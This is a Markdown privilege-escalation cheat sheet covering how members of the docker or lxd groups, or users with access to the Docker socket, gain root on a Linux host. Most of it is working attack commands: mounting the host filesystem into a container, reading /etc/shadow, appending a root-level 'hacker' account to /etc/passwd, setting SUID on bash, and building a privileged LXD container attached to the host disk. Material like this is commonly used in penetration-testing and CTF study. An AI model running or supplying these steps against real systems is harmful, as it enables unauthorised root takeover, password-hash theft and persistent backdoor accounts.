# Docker / LXD Group Privesc

## Table of Contents

1. [Overview](#overview)
2. [Docker Group](#docker-group)
3. [LXD Group](#lxd-group)

---

## Overview

Docker and LXD daemons run as root. If your user belongs to the `docker` or `lxd` group, you can create containers that mount the host filesystem with full read/write access. Inside the container you are root, and since the host `/` is mounted, you effectively have root access to the entire host.

### Check group membership

```bash
id
groups
```

If you see `docker` or `lxd` in the output, you can escalate.

## Docker Group

Docker containers run through the Docker daemon (which runs as root). Mounting the host root filesystem into a container gives root-level access to all host files.

### Exploitation

```bash
# Spawn a container with host / mounted at /mnt
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

You are now root on the host filesystem. From here:

```bash
# Read sensitive files
cat /etc/shadow

# Add a root user
echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> /etc/passwd

# Set SUID on bash
chmod +s /bin/bash
```

If no images are available locally:

```bash
# List available images
docker images

# If none, pull one (requires internet)
docker pull alpine

# If no internet, create a minimal image from the host
docker save alpine > alpine.tar  # on attacker machine
docker load < alpine.tar         # on target
```

### Docker socket

If the Docker socket is accessible (`/var/run/docker.sock`), you can also exploit it even without being in the docker group:

```bash
# Check if socket is readable
ls -la /var/run/docker.sock

# Use curl to interact with the API
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

## LXD Group

LXD manages **system containers** (full OS environments, not just a single process like Docker). The exploitation is similar: create a container, mount the host filesystem, access everything as root.

### Exploitation

1. Build or download an Alpine image (on attacker machine):

```bash
# Using distrobuilder
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
go install github.com/lxc/distrobuilder/cmd/distrobuilder@latest

# Or download a pre-built LXD-compatible image
wget https://images.linuxcontainers.org/images/alpine/edge/amd64/default/ -O lxd-alpine.tar.gz
```

2. Transfer the image to the target and import it:

```bash
lxc image import lxd-alpine.tar.gz --alias alpine
```

3. Create a container with the host filesystem mounted:

```bash
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

4. Access the host filesystem inside the container:

```bash
cd /mnt/root
cat etc/shadow
chmod +s bin/bash
```
